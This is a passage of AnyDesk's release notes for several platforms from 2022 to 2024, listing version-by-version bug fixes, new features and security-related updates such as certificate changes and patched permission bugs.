- Fixed bug when user uninstalls AnyDesk and checks the check box to remove files the files are not removed and ID saved for future installations
- Fixed error message when License Removed with Open Address Book on startup enabled
- Fixed crash when user clicks 'Autoselect' option
- Fixed bug related to "Restart my device" permission remaining inactive for a while after creating a new profile
- Fixed bug when Installation/Update window freezes if you try to install/update Anydesk after you clicked 'NO' on User Account Control window
- Fixed bug when password can be set up in both Permissions and Access
- Improved the amount of time until the main window opens
- Fixed errors in Windows Event Log
Other Changes:
- Increased account auth requests timeout up to 20s
- An Easter egg feature surprise!
10.04.2024 - 6.3.2 (Linux)
--------------------------
Fixed Bugs:
- Fixed crash in settings.
- Fixed crash in incoming only custom client.
- Fixed tray icon not showing up after boot.
- Minor other bug fixes.
28.03.2024 - 8.0.1 (macOS)
------------------
New Features:
- Redesigned System Information window
Fixed bugs:
- Improved performance (especially for hi-resolution screens)
- Fixed crash which led to session restart
- Fixed File Manager bug which led to access denied error when copying files to Windows host
- Fixed the behavior of Wake-on-LAN clients list (Intel-based macs only)
- Fixed the behavior of Keyboard Layout switcher
- Minuor UI glitches fixed
18.03.2024 - 6.3.1 (linux)
------------------
Other changes:
- Security update: Exchanged code signing certificate. The previous certificate will be invalidated soon.
06.02.2024 - 8.0.0 (macOS)
------------------
New Features:
- Redesigned Settings window
- Screen Frame
Fixed bugs:
- Mismatching mouse click coordinates after using "Auto-adapt Resolution" option
- Improved UX when few AnyDesk sessions are used in parallel
Other changes:
- Security update: Exchanged code signing certificate. The previous certificate will be invalidated soon.
29.01.2024 - 8.0.8 (Windows)
----------------------------
Other Changes:
- Security update: Exchanged code signing certificate. The previous certificate will be invalidated soon. Please update
13.12.2023 - 7.1.0 (iOS)
------------------------
New Feature:
- the cursor now indicates when action is disallowed on the remote side.
Fixed Bugs:
- fixed injection of additional keyboard events
- UI fixes and adjustments
Other Changes:
- added more information about requester of incoming session
- organized session settings
- revamped security warning dialog
21.11.2023 - 7.3.0 (macOS)
--------------------------
New Features
- Added pagination to Address Book
- Redesigned Installer Screen
- File Manager now supports drag-n-drop
Fixed Bugs
- Fixes for remote mouse cursor display
- Minor UI glitches fixed
09.11.2023 - 8.0.6 (Windows)
----------------------------
New Features
- Introduced Night Mode in DeskRT codec
Other Changes
- Improved light and dark UI Themes
06.11.2023 7.1.0 (Android)
--------------------------
New Features
- Introduced user accounts.
- Split clipboard permission for text and files.
- Improved plugin handling.
- Added splash screen for Android >= 12.
- Updated many translations.
- Improved message dialog when session ends due to auto-disconnect.
- Minor UI improvements.
Fixed Bugs
- Fixed share button / password button visibility.
- Fixed tutorial focus point after screen orientation change.
- Fixed some icons on Android 5.
- Fixed crash on notification sound due to missing vibration permission.
- File Manager: Fixed bug where modification time was not updated.
- File Manager: Now opening soft keyboard automatically when opening search.
- File Manager: Add support for ad.files.enable\_parent\_folder config item.
- File Manager: Fixed bug where file conflict dialogs might be overridden by other dialogs.
- File Manager: Improved current path display.
- Fixed a bug where the soft keyboard covered the input field when vertical space is limited.
- Fixed a bug where the soft keyboard opened everytime the app was resumed.
- Fixed a bug where the notification was not removed after stopping a VPN session.
- Fixed incorrect texts in main window for some session types.
- Fixed crash in tutorial.
- Improved clipboard handling for M3 handscanner.
- Improved clipboard synchronization.
03.11.2023 - 8.0.5 (Windows)
----------------------------
New Features
- Introduced Dark Mode
Fixed Bugs
- Fixed Ctrl-Alt-Del Dynamic Config
- Fixed Preset Password config in Custom Clients
- Fixed banner that notifies about Dynamic Config updates
- Fixed bug that allowed access to clipboard text when permission was not
granted
- Fixed bug that could cause gcapi.dll to be written to disk by Custom Clients
- Fixed handling of Windows Server Addresses in Address Book
- Fixed behavior of Acccount page in settings when using Dynamic Config
- Fixed bug that allowed Windows to go to sleep during active outgoing
Sessions
- Fixed potential crash when closing AnyDesk
- Fixed UI glitch that caused the main menu to display in the wrong location
- Fixed crash when opening About panel in settings in incoming only clients
31.10.2023 - 7.2.3 (macOS)
--------------------------
New Features
- Refined design of the Accept Window
- If the remote side has few displays connected they can be switched using Host+ key combination
- Hold the Option Key to open AnyDesk session in the new tab.
Fixed Bugs
- The issue, when clicks on the macOS login window were sometimes ignored is resolved
- AnyDesk suspends its session when the remote display is being put to sleep and resumes it on user activity
- "desk\_rt\_ipc\_error" message when trying to connect to the Login Screen is fixed
Known Issues
- It's not possible to edit certain text fields in AnyDesk Preferences on macOS Sonoma 14.0.0. It's an OS issue that is expected to be resolved in upcoming OS updates.
19.10.2023 - 8.0.4 (Windows)
----------------------------
Other Changes:
- improved in app message system to honor licenses correctly
22.09.2023 - 8.0.3 (Windows)
----------------------------
Fixed Bugs:
- Fixed some UI issues
- Fixed a crash on logout
- Fixed a couple of issues regarding account functionality
- Fixed a bug requiring newly installed clients to be restarted before dynamic configuration would take effect
- Fixed wrong preview being shown after file transfer sessions
- Fixed clipboard permission UI in the main window
- Fixed a bug allowing installation even though installation was disabled in my.anydesk II, while forcing login was active
- Fixed the logout button being shown in account settings even though the account feature was disabled
- Fixed a bug disallowing changes to the global setting to lock a desktop on session end
13.09.2023 - 7.2.2 (macOS)
--------------------------
New Features
- New option added to the Accept Window allowing remote users to manage incoming connections.
Fixed Bugs
- AnyDesk update and service install issues solved.
- AnyDesk works properly with macOS Stage Manager enabled.
- Fixed an issue with Remote Restart function.
- UI improvements for the File Manager.
- CLI issues fixed.
- Minor UI glitches addressed.
- Improvements for custom client.
12.09.2023 - 8.0.2 (Windows)
-----------------------------
Fixed Bugs:
- Fixed trace output in system user context
- Fixed usage of configuration files in system user context
12.09.2023 - 8.0.1 (Windows)
-----------------------------
New Features:
- Custom clients can now be configured to have their accept window stay open after incoming session/s end
- The text displayed in a session's tab in AnyDesk and in the Windows taskbar can now be configured via the commandline interface
Fixed Bugs:
- Fixed some UI issues
- Fixed file transfers for different sessions being shown in the same tab in the accept window
- Fixed a bug allowing file transfer sessions to be started even though disabled via settings
- Fixed missing buttons to set/edit a password and to rename permission profiles in case AnyDesk is running elevated (as admin user)
- Fixed clipboard data sent out for synchronisation even though the other side does not permit synchronisation or does not support it
- Fixed a bug limiting the number of sessions shown in the accept window to only three
- Fixed wrong Address Book contents shown on startup
- Fixed missing entry for the Personal Address Book, available for logged in users
- Fixed a race condition in the Address Book
- Fixed the Address Book not opening on startup while the free license is active
- Fixed selection of acceleration features in display settings
- Fixed keyboard support when editing a permission profile's name
- Fixed two errors about missing .dll files for Windows XP
- Fixed a freeze when trying to add an item from the main view to the Address Book
- Fixed typing an incorrect user account password would skip the error message and open a browser
- Fixed PRO icon being shown for free licenses
- Fixed main view link to telemetry consent
- Fixed a couple of tooltips regarding features depending on license
- Fixed Privacy Mode to also work in system user context
- Fixed a minor issue regarding keyboard support for the Japanese language
- Fixed keyboard translation when using asian language/s IME
- Fixed Telemetry tile reappearing after removing consent
Other Changes:
- Simplified wording in many areas
- Updated German translations
06.09.2023 - 7.1.16 (Windows)
-----------------------------
Improvements:
- Improved localization for several languages
15.08.2023 - 8.0.0 (Windows)
-----------------------------
New Features:
- Dynamic Configuration:
Licensed users can now apply changes to AnyDesk settings in real-time from within my.anydesk II.
The available options might differ according to license and other conditions.
Fixed Bugs:
- Fixed scrolling in settings
10.08.2023 - 6.3.0 (Linux)
--------------------------
New Features:
- Screen frame to indicate running incoming sessions.
Fixed Bugs:
- Fixed laggy input after closing one of two or more concurrent connections.
- Fixed issue with injecting modifier key Alt-Gr.
- Fixed issue with stuck keys (e.g. repeating characters or hanging modifier key like Shift)
- Fixed license information in the 'About AnyDesk' window being outdated.
- Fixed crash/deadlock when changing the screen resolution during an active connection.
- Fixed issues with editing tags on address book entries.
- License change now take effect immediately and do not need a restart.
- Fixed deadlock after changing language.
- Fixed 'Transmit hotkeys' not being checkable during a session.
- Improved system information details.
- Fixed tool bar in full screen mode making it impossible to click/use the top part of the screen.
- File manager now remembers the location.
- Fixed file transfer via clipboard.
- Permission for sending files via clipboard now depends on text clipboard permission.
- Fixed scam protection being displayed too often.
- Added VPN and TCP tunneling options to file transfer sessions.
- Fixed replay of session recordings.
- Fixed issue that some permissions in settings could not be changed.
- Fixed issue that permissions in settings were not displayed correctly right after opening the settings page.
- Fixed two factor authentication.
- Fixed bug that could lead to displaying the wrong address book after license change.
- Fixed deadlock that could occur when requesting elevation or switching users.
- Now showing an error message when connection attempt is rejected due to ACL restrictions.
- Fixed return from alternative screen background after session end.
- Fixed color selection for alternative screen background.
- Fixed accept window content for file transfer and VPN sessions (e.g. missing profile selection).
- Fixed many UI issues.
- Minor other bug fixes.
25.07.2023 - 7.2.1 (macOS)
--------------------------
Fixed Bugs
- Infinite "Waiting for image" message when trying to connect to the Login Screen is fixed
17.07.2023 - 7.2.0 (macOS)
--------------------------
New Features
- You can transmit audio from your mac device now (available for macOS 13.0
Ventura and higher).
- Register your User Account just inside the application.
Fixed Bugs
- Fixed Company Account login for Chrome and Edge browsers.
- Fixed an issue in the Address Book which prevented the renaming of items.
- Fixed an issue when some remote screen spots are not responding to mouse
clicks.
- Minor UI and UX improvements.
28.06.2023 - 7.1.13 (Windows)
-----------------------------
Fixed Bugs
- Fixed a bug that showed wrong Messages to licensed users
Improvements
- No longer showing the free license banner in incoming only custom clients
- Added missing translations for Simplified Chinese
05.06.2023 - 7.1.0 (macOS)
--------------------------
New Features
- Added User Account
05.06.2023 - 7.1.12 (Windows)
-----------------------------
Fixed Bugs
- Fixed a bug that didn't properly migrate some legacy screen frame config entries
- Fixed a bug that made the soft keyboard reappear on every new connection
- Fixed a bug that made the alternative screen background not work with portable custom clients
- Fixed a bug that led to unexpected results when moving address book entries to other address books that were already full
Improvements
- Properly disabled GUI elements for disabled features
- The address book no longer closes when logging into an account
- Small GUI improvements in Fullscreen menus
15.05.2023 - 7.0.3 (macOS)
--------------------------
Fixed Bugs
- Improvements for in-app messaging
08.05.2023 - 7.0.2 (macOS)
--------------------------
New Features
- Support for PAC network proxy
- Added Lithuanian localization
- Chats history in Address Book
Fixed Bugs
- fixed a bug which led to loss of connection history and favorites
- improved address search on Speed Dial
- added indicator when remote side does session recording
- UI improvements for Address Book
Important note
Version 7.0.2 is the last to support macOS 10.12 (Sierra). We strongly recommend you to upgrade your system in order to receive further AnyDesk updates.
11.04.2023 - 7.1.11 (Windows)
-----------------------------
Improvements
- The account feature is now marked as a beta feature
11.04.2023 - 7.1.10 (Windows)
-----------------------------
Fixed Bugs
- Fixed a crash when copying text with two open connections
03.04.2023 - 7.0.3 (iOS)
------------------------
New Features:
- Special keyboard
Fixed Bugs:
- Fixed whiteboard's colour picker
- Added missing Lithuanian language
- Improved scrolling
- Minor UI fixes and adjustements
24.03.2023 - 7.1.9 (Windows)
----------------------------
Fixed Bugs
- Security Bugfix
- Fixed a bug that cut off some texts in some translations within the install window
- Fixed a bug that unexpectedly closed connections when clicking on some links
- Fixed a bug that sometimes ignored Registry keys
- Fixed a bug that made it possible to sometimes copy text unexpectedly
- Fixed a bug that made it impossible to connect to custom ports
- Fixed a bug that made it possible to change overwritten Custom Client alternative screen background settings
- Fixed a bug that removed the telemetry settings on update
- Fixed a visual bug that showed the wrong number of seconds left in a session
- Fixed a bug that made it impossible to invite others via context menu
- The online state of Windows Terminal Server entries is now properly shown
- Fixed a bug where the Softkeyboard didn't work as expected when connecting to a Windows 7 or XP machine
Improvements
- Improved Account related Server communication
- Better wording of some account related errors
- Added tooltips to some Address Book elements
- Added new Combobox to Account Registration
21.03.2023 - 7.0.0 (Android)
----------------------------
New Features
- Added outgoing file transfer sessions.
- Added remote system information.
- Added remote restart.
- Added TCP tunnel feature.
- Redesign of the main UI.
- Improved interactive access. Now using notifications when the app cannot be opened.
- Improved support for menu, and recent apps button.
- Added synchronize clipboard option for incoming connections for manual clipboard synchronization. Also added automatic clipboard synchronization for outgoing connections on Android 10 and higher.
- Improved prominent disclosure for accessibility service permission.
- Minor UI improvements.
Fixed Bugs
- Fixed incorrect address when using RTL language.
- Fixed crash in incoming connections.
- Fixed closing soft keyboard on some TV devices.
- Dropped support for Android 4.x.
- Fixed orientation change on sound settings.
- Fixed auto disconnect when screen is off.
- Fixed address book visibility for incoming only clients.
- Hiding speech recognition button when action is not available.
- Fixed issue with displaying settings pages on some devices with big screens.
- Fixed bug in accept window permissions which could lead control permission being not changeable anymore.
- Added missing context menu to discovery items.
- Fixed notifications for Android 13.
- Fixed sending backspace key from Amazon FireTV devices.
- Fixed bug that caused the permission profile dialog to disappear on orientation change.
- Minor fixes.
31.01.2023 - 7.0.1 (macOS)
--------------------------
New Features
- New option for automatic closing then incoming sessions in case of user
inactivity.
Fixed bugs
- Fixed a bug affecting macOS system sleep schedule.
- Fixed a bug in displaying AnyDesk clients discovered in the local network.
- Fixed options in Session commenting dialog.
- Fixed a bug which prevented setting a custom user picture.
- Minor UI fixes.
26.01.2023 - 7.1.8 (Windows)
----------------------------
Improvements
- Better message when licenses expires
- Improved translations
- Showing the oranization the user is logged in to
- Showing the Hamburger Menu over the banner
Fixed Bugs
- Fixed a crash when interacting with the welcome screen
- Fixed a crash when entering a license key
- Fixed an issue that wrongly opened the Address Book on startup
- Fixed a bug where unattended access sessions could miss the profile selector
- Fixed a visual bug that made the screen shake on connections
- Fixed a bug with the clipboard sync
- Fixed a bug that made it impossible to copy and paste files in temporary folders
- Fixed a bug in session playbacks where the toolbar was not working properly
- Fixed a bug that disabled the discovery feature
- Fixed a bug that made it impossible to change the connection settings in forced login custom clients
- Fixed a bug that made re-invitations impossible after an invitation expired
- Fixed a bug that blocked the GUI when invitations were cancelled
02.01.2023 - 7.0.2 (iOS)
------------------------
New Features
- Added button for reporting suspicious behavior
Other Changes
- Optimization in UI when application runs not in full screen on iPad
20.12.2022 - 7.1.7 (Windows)
----------------------------
Features
- Added Command Line Interface for Proxy settings
- Added new Permission to give Frontend control over the Accept Window
- Added support to lock down clients when license expires
- Added a license restriction for session comments
Fixed Bugs
- File Transfer Sessions are now properly blocked when disabled in a Custom Client
- Fixed bug where not all update options were available
- Fixed bug where the Address Book was malfunctioning on first login
- Fixed crash when starting to play recorded sessions
- Fixed several possible freezes in the client
- Fixed crash when sending special chat messages
- Fixed crash when a lot of sessions were opened to the same backend
- Fixed bug where license restrictions did not apply after switch side
- Fixed bug where the File Manager didn't work on windows 7 virtual machines
- Fixed bug where the Chat was unavailable before a session starts
- Fixed bug that prevented Address Book actions for some licenses
- Fixed crash when changing the language to Russian
- Fixed bug where the Session Watermark was shown when licensed and free users connected to the same device
- Fixed an issue with the "Lock remote account on session end" feature
- Automatic incoming session recording now works properly
- Fixed bug that presented a list of all users after failing to connect to Windows Terminal Server
- Fixed an issue with the email validator that rejected valid email addresses for User Accounts
- Fixed crash on switching sides
- Fixed bug where synchronizing the File Clipboard didn't work on Windows 7
- Fixed bug where the Free License Banner wasn't shown on Custom Clients for the first time
- Fixed bug where it was impossible to control the Keyboard and Mouse when two sessions were opened to the same device
- Fixed bug that caused some licenses to show the wrong License Name
- Fixed bug where the UI wasn't rendered properly on license key change
- Fixed an issue with the direct connection toggle
- Fixed bug where File Browser Restrictions did not correctly apply to File Transfer Sessions
- Fixed an issue where the user was disconnected after 30 minutes if registered with free licenses
- Fixed an issue where free sessions weren't properly closed after 30 minutes
- Fixed an issue where Permission Profiles were impossible to add or remove when a lot of profiles were created
- Fixed bug that caused Permission Profile restrictions to not apply correctly
- Fixed issue where incorrect popup for TCP Tunnels was shown in some circumstances
- Fixed crash in the installer
- Fixed bug that didn't open the Address Book on startup on portable clients
- Fixed crash when opening the settings for incoming only custom clients
- Fixed bug where the Screen Frame colour wasn't migrated corrected between versions
- Fixed bug that caused Borderless Windowed Fullscreen to show up on the wrong screen
- Fixed an issue where the Screen Frame was still visible after all sessions ended
- Fixed crash when opening the Address Book
- Fixed an error when connecting via the Command Line Interface
- Fixed several license issues with the Address Book
- Fixed an issue where Session Invitations were not working on Windows 7
- Fixed an issue where the Session Recording button was highlighted even though no recording has been started
- Fixed an issue where the Register User Account button was not enabled in some cases
Improvements
- Improved GUI to show the user that he can't add more Address Book Entries
- Lowered the amount of drawn Watermarks when multiple sessions are active
- The Screen Frame isn't visible on the frontend anymore
- Added visual indicator for features that require licensing
- The Address Book tab is no longer closed when opening a new window
- Whiteboard drawings no longer disappear when a second session is started
- The Register User Account button is no longer active when mandatory fields are missing
- The User Account password is now removed from the Account menu when login failed
- Improved the License Banner to be more configurable
- When a potential scam is detected, all Permission Profiles are deactivated to improve user security
- Showing a proper error message when trying to login with none existing organizations
- Added a warning about minimum password requirements
- Added tooltips for several license restricted features
- The Privacy Icons are now consistent in different locations
- Improved translations
24.11.2022 - 7.0.0 (macOS)
--------------------------
New Features
- New look and feel for AnyDesk
- Support for macOS Dark Appearance
- More options added to Settings
- System permissions assistant added
- Session controls are now available in the Main menu
Fixed bugs
- Session playback controls behavior fixed
- Generic usability issues addressed
02.11.2022 - 6.2.1 (Linux)
--------------------------
Fixed Bugs:
- Fixed bug which caused unnecessary process spawning
- Fixed lock remote account on session end
- Fixed a deadlock when starting a session
- Fixed a deadlock in address book
- Fixed a crash when changing the settings
- Fixed a crash when running on Gnome
- Fixed a bug that prevented the accept window from showing
- Fixed issues with displaying permission profile settings correctly
- Improved UI when setting a password for a permission profile
- Improved full screen mode
- Fixed many UI issues
- Minor other bug fixes
02.11.2022 - 6.2.1 (Raspberry Pi)
---------------------------------
New Features
- We put a lot of effort into rethinking the AnyDesk user experience.
- We redesigned how permissions and passwords work from the ground up. Setup an arbitrary number of profiles to fit your individual use cases.
Fixed Bugs:
- Fixed bug which caused unnecessary process spawning
- Fixed lock remote account on session end
- Fixed a deadlock when starting a session
- Fixed a deadlock in address book
- Fixed a crash when changing the settings
- Fixed a crash when running on Gnome
- Fixed a bug that prevented the accept window from showing
- Fixed issues with displaying permission profile settings correctly
- Improved UI when setting a password for a permission profile
- Improved full screen mode
- Fixed many UI issues
- Minor other bug fixes
13.10.2022 - 7.1.6 (Windows)
----------------------------
Fixed Bugs
- Fixed an issue where a logged in user couldn't access his Address Book
- Fixed an issue where a proxy with a password was not usable
- Fixed an issue where the status of the Privacy Mode wasn't shown in the System Information
- Fixed an issue where the license banner could show up in licensed sessions
- Logging in now refreshes the AnyDesk UI
- Fixed a crash when using a device that has no D3D
- Fixed a crash when uninstalling AnyDesk
- Fixed a crash after elevation
Other Changes
- Global Search can now search for names with accented characters
07.10.2022 - 7.1.5 (Windows)
----------------------------
Fixed Bugs
- Fixed an empty prompt when trying to setup TCP Tunnels through the context menu
- Fixed a possible crash when accepting a connection
Other Changes
- Improved Account Menu on high DPI displays
- Improved the display of System Information
03.10.2022 - 7.1.4 (Windows)
----------------------------
Fixed Bugs
- Fixed an issue where the Account Registration dialog would not fit on small screens
- Fixed a crash in Update UI
Other Changes
- Improved validation of user inputs in Account Registration UI
- Improved Address Book UI to allow login in place
- Improved localizations
29.09.2022 - 7.1.3 (Windows)
----------------------------
Fixed Bugs
- Fixed an issue where backend clipboard permissions restricted frontend clipboard permissions on the same machine
- Fixed an issue where the Account icon disappeared temporarily after unlocking the global settings
- Fixed an issue where "auto opening/switching" created a new session tab
- Fixed an issue when logging in with Multi Factor Authentication
- Fixed an issue when trying to add or manage Address Books
- Fixed a crash when removing or adding license keys
- Fixed a crash after updating on Windows 7
- Fixed a crash when logging in or out of an account
- Fixed a crash after first start when upgrading from 7.1.1
Other Changes
- The Address Book now closes on Account logout
- Added Banner Links to buy/upgrade AnyDesk
- Improved localizations
- General Account Menu improvements
28.09.2022 - 7.1.2 (Windows)
----------------------------
Fixed Bugs
- Fixed a crashes in Command Line Interface
- Fixed a crash when creating more Permission Profiles
- Fixed a crash when quitting AnyDesk while trying to establish a connection
- Fixed a crash when changing "show remote cursor" setting during a running session
- Fixed an issue with too small File Manager icons
- Fixed an issue where the free license watermark did not disappear after disconnecting
- Fixed an issue with outgoing sessions via Command Line Interface
- Fixed issues with the expire tile
- Fixed issues where licenses were reverting after restart
- Fixed available Auto Update channels
Other Changes
- Invitation dialogs in incoming only Custom Clients no longer always stay in the foreground
- Some Popups no longer remain in foreground after Alt+Tab
- General Account Menu improvements
21.09.2022 - 7.1.1 (Windows)
----------------------------
New Features
- Added a Software Keyboard
Fixed Bugs
- Fixed a bug where the User Account icon disappeared
- Fixed an issue with Multi Factor Authentication for org clients
- Fixed an issue when manually registering license keys
- Fixed an issue that made it impossible to create custom profiles when the client was installed
- Fixed an issue where the "Clear previous session profiles" button disappeared after installation
- Fixed an issue when inviting through context menu
- Fixed an issue where connections only showed a grey picture when accepting an invitation
- Fixed an issue where Previous Session Profiles weren't shown in the accept window
- Fixed an issue where it was possible to create Custom Profiles when disabled
- Fixed a crash when connecting with TCP Tunnels configured
Other Changes
- Ticking "I agree with Terms & Conditions" is now mandatory when creating an account
- Improved message when removing a license key
- The Account Menu no longer remains in foreground on Alt+Tab
- The default settings of the Screen Frame width have been changed (10 to 5)
- The width of the Screen Frame is now dependent on the screen DPI
- General improvements to the Account Menu
05.09.2022 - 7.1.0 (Windows)
----------------------------
New Features
- Added User Accounts
- Added Telemetry
- Screen Frame for non-watched screens
- Added setting to automatically show/hide remote cursor
- Added Custom Client setting to force users to login
- Text Clipboard is now transitive across multiple sessions
- Added Auto Update channel Main
- Added Screen Frame support to Group Policies
- Added Session Invitation support to Group Policies
- Frontend is now able to request elevation in file transfer sessions
Fixed Bugs
- Fixed scaling issues when switching AnyDesk between displays with different scales
- Fixed issues with many backend monitors
- When connecting to Android devices, the Menu Button is now available
- Privacy Mode can now also be used, when permission is given after connection start
- Fixed an issue with default language setting in custom clients
- Fixed a crash when clicking Exit in Fullscreen Menu for custom clients
- Fixed issues with settings not visible on small screens in Fullscreen
- Fixed a crash in the File Manager when a folder and a file had identical names
- Fixed a crash in the File Manager after deleting files
- Fixed an issue with the File Manager that created zero sized files if files had special characters
- Fixed an issue with the File Manager where remote devices folders weren't properly shown when connecting for the first time
- Fixed an issue with the File Manager where the modify time of transferred files was incorrect
- Fixed an issue with setting for Custom Clients that controls permission profile selection
- Fixed an issue with transferring files via Clipboard
- Auto-adapt resolution now has the correct aspect ratio with widescreen backends
- Fixed several smaller Address Book issues
- The Whiteboard Menu can no longer be opened without permission
- Fixed an issue where a disconnected session could keep the backend alive
- Fixed an issue where Privacy Mode didn't work with alternative background
- Fixed an issue where Privacy Mode didn't work after switch sides
- Fixed an issue where Privacy Mode didn't work after sign in
- Screen Frame does now work after Remote Restart
- Fixed a client freeze issue when navigating the language dropdown menu with the keyboard
- Fixed a crash when changing the license key several times
- Outgoing only Custom Clients can no longer Switch Sides
- Fixed a crash when transmitting elevation credentials
- Updating AnyDesk no longer automatically creates Start Menu and Desktop shortcuts
- Fixed an issue with Permission Profiles where seemingly unchangeable permissions were changeable in the accept window
- Fixed a missing dll prompt on first time startup with Windows XP
Other Changes
- Improved Session Invitation Dialog
- The screen frame settings were improved
- All System Information is now shown when connecting to a Linux Backend
- Power Licenses can now enable "On session close ask for comment"
- Removed irrelevant functionality from outgoing only clients
- Improved localization
- Improved client awareness of license restrictions
11.08.2022 - 7.0.14 (Windows)
-----------------------------
Fixed Bugs
- Fixed a security vulnerability.
19.07.2022 - 7.0.13 (Windows)
-----------------------------
Fixed Bugs
- Fixed alternative screen background showing too late on Windows 7
14.07.2022 - 7.0.12 (Windows)
-----------------------------
Fixed Bugs
- Fixed incorrect link to session recordings
- Fixed incorrect link to trace files
23.06.2022 - 7.0.11 (Windows)
-----------------------------
Fixed Bugs
- Main Window remembers which sections were marked as "show all"
- Fixed GUI bug when both a file transfer and a Desk RT session was established at the same time
- Fixed main menu for incoming only custom clients
05.07.2022 6.6.0 (macOS)
------------------------
New Features
- White board allows to draw annotations overs the remote screen.
Fixed Bugs
- Added install-location attribute to the PKG installer.
- Fixed crash in Wake On LAN settings.
- Fixes Settings unlock behavior.
- Fixed input blocking for Privacy mode.
- Added option to switch off sound transmission from the remote computer.
- Added notification for incoming chat messages.
- Fixed chat message logging.
- UI fixes for file manager.
24.06.2022 6.2.0 (Linux)
------------------------
New Features
- We put a lot of effort into rethinking the AnyDesk user experience.
- We redesigned how permissions and passwords work from the ground up. Setup an arbitrary number of profiles to fit your individual use cases.
- Protect your privacy by automatically exchanging your Desktop Wallpaper during incoming sessions.
- Now DEB and RPM packets are up to date with modern Linux distributions
Fixed Bugs
- General improvements of stability of the application
20.06.2022 6.6.0 (Android)
--------------------------
New Features
- Support for new plugins.
Note
- This is the last version supporting Android 4.4.
03.06.2022 - 7.0.10 (Windows)
----------------------------
Fixed Bugs
- Fixed bug that prevented crash reports from being sent correctly.
31.05.2022 - 7.0.9 (Windows)
----------------------------
Fixed Bugs
- Fixed issue that disabled privacy mode when switching backend accounts
- File Transfer Sessions now work with manually typed UA passwords
- Fixed Windows XP GUI issues
- Fixed possible crash when editing Address book tags
- Fixed connection issue when alternative screen background is active on a Windows 7 backend
- Fixed wrong look of accept window when a session is reconnected
Other Changes
- Improved wordings in some translations
- Improved Drag & Drop behavior in Address Book
25.05.2022 - 7.0.1 (iOS)
------------------------
New Features:
- Support of drag and drop files between application
- Added "Recent apps" button for Android sessions
Fixed Bugs:
- Fixed issues during establishing connection
- Fixed issue with direct connection
- Fixed black screen during connection to device with high DPI resolution monitor
Other Changes:
- Optimisation in screen capturing
09.05.2022 - 6.5.1 (macOS)
--------------------------
New features
- Option to prevent display sleep during outgoing sessions
- MDM configuration is enabled for standard client
- Added button to security settings that removes all stored previous session profiles
- Added separate permissions for file and text transfer via clipboard to the frontend
- Added "Recent apps" button support for Android connections
Fixed bugs
- Layout issue in accept window
- Clipboard file transfer button in accept window
Other changes
- Improved performance for high-resolution displays
- Improved customization options for custom client and MDM
29.04.2022 - 7.0.8 (Windows)
----------------------------
New Features
- Windows 11 is now fully supported
- Added feature flag for discovery
Fixed Bugs
- Fixed issue that switches the alternative background a frame too late
- Chat popup now remembers unsent user input
- Fixed issue that showed the wrong modified time after file transfer
- Switching sides and requesting elevation during a sessions no longer causes the remote account to lock
- Fixed issue that permanently disabled the clipboard
- Fixed issue that made it impossible to drag and drop items in the address book
- Fixed overlapping options in Direct3D Fullscreen
- Fixed menu bar in full screen mode when two displays on top of each other are used
- Fixed issue that made session recordings impossible
- Fixed issue with incorrect file manager properties
- Fixed issue with incorrect system information
- Switching sides now shows the correct id in the session tab
Other Changes
- Settings are now the first option in the Main Menu
- Command line interface of MSI clients has been improved
- Backend input is now blocked when privacy mode is activated
- Close icon no longer overlaps the address in a tab
- Removed irrelevant functionality in outgoing only clients
- URLs are now displayed on hover
21.04.2022 6.5.2 (Android)
--------------------------
Fixed Bugs
- Improved stability when using MDM.
06.04.2022 6.5.0 (Android)
--------------------------
New Features
- Easy management of permissions in all situations using permission profiles in security settings.
- Option to disable online state monitoring of other clients in the settings.
- Optional sounds for sessions.
- Korean translation.
- Improved size calculation of shortcut icon.
Fixed Bugs
- Fixed setting up drawer layout on some devices.
- Minor fixes.
24.03.2022 - 7.0.0 (iOS)
------------------------
New Features:
- New design
- More settings available
- Support for different language layouts of hardware keyboard
23.03.2022 - 7.0.7 (Windows)
----------------------------
New Features
- Added feature flag for session recordings
Fixed Bugs
- Fixed issue that switches the alternative background a frame too late
- Fixed issue with error bar when internet access is removed
- Fixed issue that made it impossible to connect to the AnyDesk Network for incoming only clients for some configurations
- Fixed issue that removed several panels from main window in clients without installation
- Fixed "More" hover button in session invitation
- Fixed issue that has hidden the menu bar in fullscreen if two monitors are placed on top of each other
- Fixed issue for first invitations on newly installed clients
- Fixed issue with sync clipboard files that created a never-ending copy task under some circumstances
- Fixed crash when requesting elevation
- Fixed crash for some command line arguments
- Fixed issue with session recordings starting in Fullscreen for some configurations
- Fixed issue that left comboboxes of closed dialogs open
Other Changes
- Moving Address Book Entries has been simplified
- Renaming address book items has been improved
- Added missing display options to fullscreen menu
- Improved custom logos
- Improved error message, if an already existing ID is added to Wake-On-LAN setting
- Portable Clients can no longer be remotely restarted
- Improved Group Policy Template hints
- Incoming only clients can now set the password from the main window
- Different fullscreen menus now have the same order
- Improved confirm deletion dialog
- Improved error message, if file transfer session is started with backend that does not support the file manager
- Improved behavior of checkboxes for very small window sizes
16.03.2022 - 6.5.0 (macOS)
--------------------------
New features
- session permission profiles
Fixed bugs
- main window layout bug fixed
Important note
Version 6.5.0 is the last to support macOS 10.11 (El Capitan). We strongly recommend you to upgrade your system in order to receive further AnyDesk updates.
01.03.2022 - 7.0.6 (Windows)
----------------------------
New Features
- Improved usability of setting passwords for profiles
Fixed Bugs
- Fixed issue that made AnyDesk crash when too many sessions were requested
- Fixed issues with wrong tray icons
- Fixed broken Screen Edge Window Drag actions
- Fixed command line option --remove-password
- Fixed connection to relays on port 80 through http proxy
- Fixed session invitation dialog being shown on multiple screens
- Custom Clients with disabled file manager can no longer accept file transfer session requests
- Fixed issues when removing a license
- Fixed issues when AnyDesk was maximized on devices with multiple screens that have different resolutions
Other Changes
- Added back connection type icon tooltips, indicating if session is routed or direct
- Added multiple group policy template keys
- Entering spaces in address bar finds previous sessions without spaces
- Reworked "Clear previous session profiles" button in Settings
- Improved file transfer session accept window
- Improved some wordings to be more consistent
18.02.2022 - 7.0.5 (Windows)
----------------------------
New Features
- Introduced new advanced custom client settings to disable recent sessions
- Introduced new advanced custom client settings to disable favorites
- Added button to security settings that removes all stored previous session profiles
- Added config option to hide/show the "Install AnyDesk" tile
- Added separate permissions for file and text transfer via clipboard to the frontend
Fixed Bugs
- Fixed automatic proxy detection
- Fixed default behavior of permission to transmit audio, that could sometimes be incorrectly disabled
- Fixed bug that rarely corrupted parts of the AnyDesk configuration when updating
- Fixed interaction of file transfer sessions and Previous Session profile
- Fixed bug that prevented some features from being used in file transfer sessions
- Fixed update of tcp tunnel dialog when adding or removing rules
- Properly hide screen frame window when not in use
